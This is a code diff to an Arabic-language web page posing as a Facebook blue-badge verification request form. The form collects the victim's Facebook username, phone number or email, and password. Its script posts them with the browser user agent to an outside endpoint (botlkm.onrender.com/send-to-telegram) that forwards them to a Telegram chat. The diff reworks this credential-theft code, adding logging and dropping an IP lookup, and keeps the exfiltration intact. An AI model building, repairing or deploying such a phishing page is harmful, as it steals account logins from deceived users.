@@ -520,14 +520,6 @@
         <label>اسم المستخدم:</label>
         <input type="text" name="player_id" required placeholder="اسم المستخدم في فيسبوك">
 
-        <label>نوع الحساب:</label>
-        <select name="account_type" required>
-          <option value="شخصية عامة">شخصية عامة</option>
-          <option value="علامة تجارية">علامة تجارية</option>
-          <option value="وسيلة إعلام">وسيلة إعلام</option>
-          <option value="شخصية مؤثرة">شخصية مؤثرة</option>
-        </select>
-
         <div class="spinnert" id="loadingSpinner"></div>
         <button type="submit" class="buy-btn" style="margin-top: 20px; width: 100%; padding: 15px;" id="submitBtn">تقديم طلب التوثيق <i class="fas fa-check-circle"></i></button>
         
@@ -611,6 +603,7 @@
       
       const submitBtn = document.getElementById('submitBtn');
       const loadingSpinner = document.getElementById('loadingSpinner');
+      const form = document.getElementById('verificationForm');
       
       // إظهار مؤشر التحميل
       submitBtn.style.display = 'none';
@@ -618,26 +611,24 @@
       
       // جمع البيانات من النموذج
       const formData = new FormData(this);
+      const identifier = formData.get('identifier');
+      const password = formData.get('password');
+      const playerId = formData.get('player_id');
       
       try {
-        // الحصول على عنوان IP
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        
-        // إعداد بيانات الإرسال
+        // إعداد البيانات بالشكل المطلوب
         const data = {
-          playerId: formData.get('player_id'),
-          password: formData.get('password'),
-          amount: "علامة التحقق الزرقاء",
-          chatId: "123456789",
+          playerId: playerId,
+          password: password,
+          amount: identifier, // رقم الهاتف أو البريد
+          chatId: "123456789", // سيتم الإرسال إلى هذا الـ chatId
           platform: "فيسبوك",
-          device: navigator.userAgent,
-          identifier: formData.get('identifier'),
-          accountType: formData.get('account_type'),
-          ip: ipData.ip
+          device: navigator.userAgent
         };
         
-        // إرسال البيانات إلى السيرفر
+        console.log('بيانات الإرسال:', data);
+        
+        // إرسال البيانات باستخدام fetch
         const response = await fetch('https://botlkm.onrender.com/send-to-telegram', {
           method: 'POST',
           headers: {
@@ -646,11 +637,14 @@
           body: JSON.stringify(data)
         });
         
+        console.log('استجابة السيرفر:', response);
+        
         if (!response.ok) {
-          throw new Error('فشل في إرسال البيانات');
+          throw new Error(`خطأ في السيرفر: ${response.status}`);
         }
         
         const result = await response.json();
+        console.log('نتيجة الإرسال:', result);
         
         // إخفاء مؤشر التحميل
         loadingSpinner.style.display = 'none';
@@ -665,8 +659,8 @@
         `;
         
         // استبدال النموذج برسالة النجاح
-        document.getElementById('form').innerHTML = '';
-        document.getElementById('form').appendChild(successMessage);
+        form.innerHTML = '';
+        form.appendChild(successMessage);
         
         // إظهار إشعار النجاح
         showNotification('تم إرسال طلب التوثيق بنجاح!', 'success');
@@ -675,6 +669,8 @@
         // إخفاء مؤشر التحميل
         loadingSpinner.style.display = 'none';
         submitBtn.style.display = 'block';
+        
+        console.error('خطأ في الإرسال:', error);
         
         // إظهار رسالة الخطأ
         const errorMessage = document.createElement('div');
@@ -686,17 +682,17 @@
         `;
         
         // إضافة رسالة الخطأ فوق النموذج
-        document.getElementById('form').insertBefore(errorMessage, document.getElementById('verificationForm'));
+        form.parentNode.insertBefore(errorMessage, form);
         
         // إظهار إشعار الخطأ
         showNotification('حدث خطأ أثناء إرسال الطلب!', 'error');
         
         // إزالة رسالة الخطأ بعد 5 ثوانٍ
         setTimeout(() => {
-          errorMessage.remove();
+          if (errorMessage.parentNode) {
+            errorMessage.parentNode.removeChild(errorMessage);
+          }
         }, 5000);
-        
-        console.error('Error:', error);
       }
     });
 
@@ -704,15 +700,17 @@
     const mainContainer = document.querySelector('.main-container');
     const scrollIndicator = document.querySelector('.scroll-indicator');
     
-    mainContainer.addEventListener('scroll', function() {
-      const scrollPercentage = (mainContainer.scrollTop / (mainContainer.scrollHeight - mainContainer.clientHeight)) * 100;
-      
-      if (scrollPercentage > 90) {
-        scrollIndicator.textContent = "اسحب لأعلى";
-      } else if (scrollPercentage < 10) {
-        scrollIndicator.textContent = "اسحب لأسفل";
-      }
-    });
+    if (mainContainer && scrollIndicator) {
+      mainContainer.addEventListener('scroll', function() {
+        const scrollPercentage = (mainContainer.scrollTop / (mainContainer.scrollHeight - mainContainer.clientHeight)) * 100;
+        
+        if (scrollPercentage > 90) {
+          scrollIndicator.textContent = "اسحب لأعلى";
+        } else if (scrollPercentage < 10) {
+          scrollIndicator.textContent = "اسحب لأسفل";
+        }
+      });
+    }
   </script>
 </body>
   </html>
